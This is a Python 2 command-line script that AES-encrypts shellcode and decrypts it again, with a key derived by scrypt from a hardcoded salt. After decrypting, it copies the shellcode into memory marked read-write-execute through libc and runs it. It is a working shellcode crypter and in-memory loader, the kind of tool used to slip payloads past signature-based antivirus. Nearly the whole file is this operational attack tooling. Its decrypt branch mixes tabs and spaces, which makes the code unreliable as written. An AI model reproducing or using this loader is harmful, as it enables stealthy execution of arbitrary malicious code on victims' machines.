from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import sys
import argparse
from Crypto.Cipher import AES
import pyscrypt
from os import urandom
import base64

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--shellcode", help="Please provide the shellcode in the format \\xAA\\xAA", type=str, required=True)
parser.add_argument("-k", "--key", help="Please provide the encryption key", type=str, required=True)
parser.add_argument("-d", "--decrypt", help="this will decrypt the provided shellcode", action="store_true")
parser.add_argument("-e", "--encrypt", help="this will encrypt the provided shellcode", action="store_true")
args = parser.parse_args()


def padding(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def unpadded(s):
	return s[:-ord(s[len(s)-1:])]

def Encrypt(cleartext, key):
	iv = urandom(AES.block_size)
	#iv = "1234567890123456"
	cleartext = padding(cleartext)
	cipher= AES.new(key, AES.MODE_CBC, iv)
	return iv + cipher.encrypt(bytes(cleartext))


#decrypt
def Decrypt(ciphertext, key):
	#iv = "1234567890123456"
	iv = ciphertext[:AES.block_size]
	#print iv
	decipher = AES.new(key, AES.MODE_CBC, iv)
	return unpadded(decipher.decrypt(bytes(ciphertext[AES.block_size:])))

def RunShellcode(shellcode):
	libc = CDLL('libc.so.6')
	sc = c_char_p(shellcode)
	size = len(shellcode)
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr, size, 0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))
	run()

def PrintShellcode(sc):
	#sc = sc.encode('hex')
	#shellcode_parts = [sc[i:i+2] for i in range(0, len(sc), 2)]
	#print "\\x" + "\\x".join(shellcode_parts)
	print base64.b64encode(sc)

key = pyscrypt.hash(args.key, "mysalt", 1024, 1, 1, 16)


#trouble shooting. Ignore
"""
print "Encrypting the shellcode"
encrypted = Encrypt(shellcodebytes, key)
print encrypted[AES.block_size:]
#encrypted_parts = [encrypted.encode('hex')[i:i+2] for i in range(0, len(encrypted.encode('hex')), 2)]
#print encrypted_parts
print "From the PrintShellCode function"
PrintShellcode(encrypted)
print "\n"

print "Decrypting the shellcode"
decrypted = Decrypt(encrypted, key)
print decrypted
decrypted_parts = [decrypted[i:i+2] for i in range(0, len(decrypted), 2)]
decrypted_shellcode = "\\x" + "\\x".join(decrypted_parts)
print decrypted_shellcode
print "\nFrom the PrintShellcode function"
PrintShellcode(decrypted.decode('hex'))
#RunShellcode(decrypted.decode('hex'))
"""
if args.encrypt:
	shellcode = args.shellcode.replace('\\x', '')
	shellcodebytes = bytearray(shellcode)
	print "this is the shellcode you entered: "
	print shellcode
	encrypted = Encrypt(shellcodebytes, key)
	print "Printing the encrypted shellcode"
	print encrypted + "\n"
	PrintShellcode(encrypted)
if args.decrypt:
	shellcode = base64.b64decode(args.shellcode)
        print "this is the shellcode you entered: "
        print shellcode
	decrypted = Decrypt(shellcode, key)
	print "This is the decrypted shellcode"
	PrintShellcode(decrypted)
	decrypted_parts = [decrypted[i:i+2] for i in range(0, len(decrypted), 2)]
	decrypted_shellcode = "\\x" + "\\x".join(decrypted_parts)
	print decrypted_shellcode
	RunShellcode(decrypted.decode('hex'))


"""
#Execute the shellcode
libc = CDLL('libc.so.6')
sc = c_char_p(decrypted.decode('hex'))
size = len(decrypted.decode('hex'))
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
"""
